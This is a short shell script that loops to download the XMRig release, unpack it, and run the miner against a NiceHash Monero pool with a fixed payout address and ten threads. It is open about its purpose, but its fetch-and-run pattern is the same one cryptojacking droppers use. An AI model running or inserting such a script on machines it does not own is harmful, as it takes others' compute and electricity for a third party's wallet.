#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 && ./xmrig --donate-level 1 -o randomxmonero.eu.nicehash.com:3380 -u 3LpY6R9v2N3583LUrMBEGQCRnZjoqaDc2M.EREN -k --nicehash --coin monero -t10

 echo COUNTER $COUNTER
     let COUNTER-=1
done
